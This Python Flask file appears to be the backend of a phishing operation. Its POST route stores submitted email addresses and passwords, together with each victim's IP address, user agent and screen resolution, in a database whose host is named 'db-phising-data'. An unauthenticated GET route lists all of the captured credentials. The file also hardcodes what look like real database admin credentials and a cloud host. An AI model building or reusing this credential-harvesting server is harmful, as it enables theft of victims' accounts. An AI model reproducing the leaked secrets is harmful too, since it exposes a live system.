from flask import Flask, jsonify, request, escape
from flask_cors import CORS, cross_origin
import mysql.connector
from datetime import datetime

app = Flask(__name__)
CORS(app)  # Use the extension

def get_db_connection():
    config = {
        'user': 'doadmin',
        'password': 'AVNS_DsUoH2bwh5aqdSVJtB6',
        'host': 'db-phising-data-do-user-14034535-0.b.db.ondigitalocean.com',
        'port': '25060',
        'database': 'drzgrosle',
        'ssl_ca': 'ca-certificate.crt'
    }
    conn = mysql.connector.connect(**config)
    return conn

@app.route('/data', methods=['POST'])
def insert_data():
    data = request.json

    # Input validation
    if not all(key in data for key in ['email', 'password', 'user_agent', 'resolution']):
        return jsonify({'status': 'failure', 'message': 'Missing required fields'}), 400

    # Input sanitization
    data = {k: escape(v) for k, v in data.items()}

    data['ip_address'] = request.remote_addr
    data['timestamp'] = datetime.now()

    try:
        db_conn = get_db_connection()
        cursor = db_conn.cursor()

        query = f"INSERT INTO uzivatele (email, password, ip_address, user_agent, resolution, timestamp) VALUES (%(email)s, %(password)s, %(ip_address)s, %(user_agent)s, %(resolution)s, %(timestamp)s)"
        cursor.execute(query, data)
        db_conn.commit()
    except mysql.connector.Error as err:
        return jsonify({'status': 'failure', 'message': 'Database error', 'error': str(err)}), 500
    finally:
        cursor.close()
        db_conn.close()

    return jsonify({'status': 'success'}), 200


@app.route('/data', methods=['GET'])
def fetch_data():
    try:
        db_conn = get_db_connection()
        cursor = db_conn.cursor()

        query = "SELECT * FROM uzivatele"
        cursor.execute(query)
        rows = cursor.fetchall()

        result = []
        for row in rows:
            result.append({
                'id': row[0],
                'email': row[1],
                'password': row[2],
                'ip_address': row[3],
                'user_agent': row[4],
                'resolution': row[5],
                'timestamp': row[6],
            })

        return jsonify(result), 200
    except mysql.connector.Error as err:
        return jsonify({'status': 'failure', 'message': 'Database error', 'error': str(err)}), 500
    finally:
        cursor.close()
        db_conn.close()

